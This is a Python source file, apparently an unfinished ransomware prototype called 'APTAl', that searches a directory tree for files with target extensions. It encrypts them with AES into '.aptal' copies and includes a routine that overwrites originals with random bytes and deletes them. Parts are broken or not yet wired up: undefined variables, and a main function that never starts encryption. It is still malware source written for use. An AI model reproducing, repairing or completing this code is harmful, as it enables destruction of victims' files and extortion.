import os
import sys
import random
from queue import Queue
from threading import Thread

import Utils
sys.path.append(os.path.abspath('../hasp'))
from AESCipher import AESCipher
class APTAl(Thread):
    def __init__(self, filelist, aeskey):
        Thread.__init__(self)
        self.file_list = filelist
        self.aes_key = aeskey
    
    def run(self):
        while True:
            innocent_file_path = self.file_list.get()
            try:
                self.infect(innocent_file_path)
            finally:
                self.file_list.task_done()

    def purge_original_file(self,path,repeat=1):
        file_size = os.path.getsize(path)
        chunk_size = 1024
        with open(path,"wb") as disarrange_file:
            # random.getrandbits(8) -> 2^8
            for _ in range(repeat):
                dummy_data = bytearray(random.getrandbits(8) for _ in range(chunk_size))
                disarrange_file.write(dummy_data)
                disarrange_file.seek(0,0)
        os.remove(path)
            

    def infect(self,path):
        cipher = AESCipher(self.aes_key)
        iv = AESCipher.generate_iv()
        encrypted_file_path = path+".aptal"
        with open(path, 'rb') as infile:
            with open(encrypted_file_path, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunk_size)
                    if len(chunk) == 0:
                        break
                    outfile.write(cipher.encrypt(iv, chunk))
        


def isInTargetFiles(_extention):
    """
        Binary Search to find extentions in the target files
    """
    left = 0
    right = len(Utils.file_extentions) - 1

    while left <= right:
        mid = (left + right)// 2
        current = Utils.file_extentions[mid]
        if current  > _extention:
            right = mid - 1
        elif current  < _extention:
            left = mid + 1
        else:
            return True
    return False

def isValidFile(file_path):
    """
        Determining whether the file is valid or not
    """
    if file_path != Utils.whatismyname:
        _extention = file_path.split(".")[-1].lower()
        if len(_extention) == 1 or isInTargetFiles(_extention):
            return True
    return False

def findFiles(path):
    """
        Recon
    """
    _goodbye_files = []
    for directory_path, directories, files in os.walk(path):
        for fiile in files:
            if isValidFile(fiile):
                _goodbye_files.append(os.path.join(directory_path,fiile))
    return _goodbye_files

def keyStoreCreate():

    with open(aesIV_File_store_path,"w") as key_storing_file:
        key_storing_file.write(Utils.whatismyname)
        key_storing_file.write(Utils.whatismypurpose)
        # and so on
    print("STORE FILE CREATED")

def main():
    """
    TODO:1 Multithread -> File Explorer and Encryption
    TODO:2
        re-write file with dummy data
        del <object>
        garbage collection
    """
    keyStoreCreate()
    found_files = findFiles(Utils.root_directory)

    

if __name__ == "__main__":
    main()